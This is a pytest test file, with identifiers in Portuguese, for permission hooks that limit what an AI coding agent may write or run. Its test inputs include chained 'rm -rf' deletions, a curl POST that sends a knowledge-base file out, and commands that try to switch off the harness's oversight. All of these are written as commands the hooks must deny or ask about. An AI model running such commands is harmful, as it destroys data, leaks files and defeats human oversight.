import json
import shutil
import subprocess
from pathlib import Path

import pytest

import hooks
import ledger
from conftest import BIN


def decision(out):
    return ((out or {}).get("hookSpecificOutput") or {}).get("permissionDecision")


def write(proj, rel, tool="Write"):
    return hooks.run("pretool", {"tool_name": tool, "session_id": "sessao-1",
                                 "tool_input": {"file_path": str(proj / rel)}})


def start(proj, sid="sessao-1"):
    led = ledger.Ledger(proj)
    led.sync()
    led.g1("D-001", True, None)
    led.iniciar("D-001", sid)


def test_escrita_fora_do_escopo(proj):
    assert decision(write(proj, ".harness/bin/hooks.py")) == "deny"
    assert decision(write(proj, "src/app.py")) == "deny"
    assert decision(hooks.run("pretool", {"tool_name": "Write", "tool_input": {"file_path": "C:/fora/x.md"}})) == "deny"


def test_arquivos_do_humano(proj):
    assert decision(write(proj, "ada/demandas.yaml")) == "deny"
    assert decision(write(proj, "CLAUDE.md")) == "deny"


def test_kb_pede_confirmacao(proj):
    assert decision(write(proj, "ada/kb/internal-tools/regras/x.md", "Edit")) == "ask"
    assert decision(write(proj, "ada/kb/internal-tools/regras/x.py")) == "deny"


def test_pasta_da_demanda(proj):
    assert decision(write(proj, "ada/demandas/D-001/epico.md")) == "deny"  # sem demanda ativa
    start(proj)
    assert write(proj, "ada/demandas/D-001/epico.md") == {} or decision(write(proj, "ada/demandas/D-001/epico.md")) is None
    assert decision(write(proj, "ada/demandas/D-002/epico.md")) == "deny"
    assert decision(write(proj, "ada/demandas/D-001/cobertura.md")) == "deny"


def test_atlassian_escrita(proj):
    data = {"tool_name": "mcp__abc__createJiraIssue", "tool_input": {}}
    assert decision(hooks.run("pretool", data)) == "deny"
    assert hooks.run("pretool", {"tool_name": "mcp__abc__getJiraIssue", "tool_input": {}}) is None
    start(proj)
    led = ledger.Ledger(proj)
    led.data["demandas"]["D-001"]["state"] = "accepted"
    led.save()
    ledger.Ledger(proj).g3("D-001", "pode")
    assert decision(hooks.run("pretool", data)) == "ask"


def sh(cmd, tool="Bash"):
    return decision(hooks.run("pretool", {"tool_name": tool, "tool_input": {"command": cmd}}))


@pytest.mark.parametrize("cmd", [
    '& ".venv/Scripts/python.exe" .harness/bin/kb.py buscar "limite"',
    "git status",
    "PYTHONIOENCODING=utf-8 .venv/Scripts/python.exe .harness/bin/ajuda.py; echo ----; "
    "PYTHONIOENCODING=utf-8 .venv/Scripts/python.exe .harness/bin/ledger.py status",
    ".venv/Scripts/python.exe .harness/bin/kb.py stats | head -20",
    ".venv/Scripts/python.exe .harness/bin/kb.py validar && .venv/Scripts/python.exe .harness/bin/kb.py apontamentos --abertos",
    ".venv/Scripts/python.exe .harness/bin/doctor.py 2>&1",
    "$env:PYTHONIOENCODING='utf-8'; .venv/Scripts/python.exe .harness/bin/report.py",
])
def test_shell_seguro_passa_sem_perguntar(proj, cmd):
    assert sh(cmd) == "allow", cmd


@pytest.mark.parametrize("cmd", [
    "npm install",
    "pip install requests",
    "git status; rm -rf kb",
    "cat x & rm -rf kb",
    "git log\nrm -rf kb",
    "Remove-Item kb/x.md",
    "git push origin main",
    "git commit -m x",
    "FOO=1 rm -rf kb",
    "curl -X POST https://exemplo.com -d @kb/x.md",
    "Invoke-RestMethod https://x -Method Post -Body $b",
])
def test_shell_perigoso_pergunta(proj, cmd):
    assert sh(cmd) == "ask", cmd


@pytest.mark.parametrize("cmd", [
    "echo x > .harness/bin/hooks.py",
    "sed -i 's/a/b/' CLAUDE.md",
    "cp /tmp/x.md .claude/skills/nova/SKILL.md",
    "Set-Content .harness/demandas.yaml 'x'",
    "python -c \"open('.harness/config.yaml','w').write('x')\"",
    "mv x tests/test_hooks.py",
])
def test_shell_nao_grava_no_harness(proj, cmd):
    assert sh(cmd) == "deny", cmd


@pytest.mark.parametrize("cmd", [
    "find . -name '*.md'",
    "jq '.nodes[] | .title' C:/tmp/artifact.json",
    "python -I -c \"import json,sys; print(json.load(open(sys.argv[1]))['x'])\" C:/scratch/a.json",
    "sed -n '1,40p' kb/README.md",
    "echo $(whoami)",
    ".venv/Scripts/python.exe .harness/bin/kb.py stats > C:/scratch/stats.txt",
    "cat C:/scratch/artifact/index.html | head -50",
])
def test_resto_fica_com_o_claude_code(proj, cmd):
    assert sh(cmd) in (None, "allow"), cmd


def test_shell(proj):
    assert decision(hooks.run("pretool", {"tool_name": "Bash",
                                          "tool_input": {"command": "echo {} > .harness/ledger.json"}})) == "deny"


def test_agente_nao_desliga_fiscalizacao(proj):
    for cmd in ('.venv/Scripts/python.exe .harness/bin/manutencao.py on',
                'cp .claude/settings.harness.json .claude/settings.json',
                'mv .harness/bin/hook.sh x', '$env:HARNESS_DEV="1"'):
        assert decision(hooks.run("pretool", {"tool_name": "PowerShell", "tool_input": {"command": cmd}})) == "deny", cmd


def test_stop_exige_entrega_da_propria_sessao(proj):
    start(proj, "sessao-1")
    out = hooks.run("stop", {"session_id": "sessao-1"})
    assert out and out["decision"] == "block" and "result.json" in out["reason"]
    assert hooks.run("stop", {"session_id": "outra"}) is None
    for _ in range(3):
        hooks.run("stop", {"session_id": "sessao-1"})
    assert hooks.run("stop", {"session_id": "sessao-1"}) is None  # depois de 3 bloqueios, libera


def test_stop_passa_com_entrega_ok(proj, entrega):
    start(proj, "sessao-1")
    assert hooks.run("stop", {"session_id": "sessao-1"}) is None


def test_stop_confere_kb_alterada(proj):
    hooks.run("posttool", {"session_id": "s-9", "tool_name": "Write",
                           "tool_input": {"file_path": str(proj / "ada/kb/internal-tools/regras/reprocessamento-ajustes.md")}})
    f = proj / "ada/kb/internal-tools/regras/reprocessamento-ajustes.md"
    f.write_text(f.read_text(encoding="utf-8").replace("- **Fontes:** SRC-IT-001\n", "- **Fontes:** SRC-IT-404\n", 1),
                 encoding="utf-8")
    out = hooks.run("stop", {"session_id": "s-9"})
    assert out and "Base de Conhecimento inválida" in out["reason"]


def test_session_start_injeta_id(proj):
    start(proj, "sessao-1")
    ctx = hooks.run("session_start", {"session_id": "sessao-1"})["hookSpecificOutput"]["additionalContext"]
    assert "sessao-1" in ctx and "D-001" in ctx and "NESTA sessão" in ctx


def test_fail_closed(proj, monkeypatch):
    monkeypatch.setattr(hooks, "pretool", lambda data: 1 / 0)
    monkeypatch.setitem(hooks.HANDLERS, "pretool", hooks.pretool)
    assert decision(hooks.run("pretool", {"tool_name": "Read"})) == "deny"
    monkeypatch.setenv("HARNESS_DEV", "1")
    assert hooks.run("pretool", {"tool_name": "Read"}) is None


def test_metricas_da_transcricao(proj):
    tr = Path(__file__).parent / "fixtures" / "contract" / "transcript_sample.jsonl"
    hooks.run("posttool", {"session_id": "s-7", "transcript_path": str(tr), "tool_name": "Read", "tool_input": {}})
    m = json.loads((proj / ".ada" / "cache" / "metrics" / "s-7.json").read_text(encoding="utf-8"))
    assert m["messages_with_usage"] > 0 and m["output_tokens"] > 0


@pytest.mark.skipif(not (shutil.which("bash")), reason="sem bash")
def test_wrapper_sem_python_nega(tmp_path):
    out = subprocess.run(["bash", str(BIN / "hook.sh"), "pretool", str(tmp_path / "nao-existe.exe")],
                         input='{"tool_name":"Read"}', capture_output=True, text=True, encoding="utf-8")
    assert '"permissionDecision":"deny"' in out.stdout
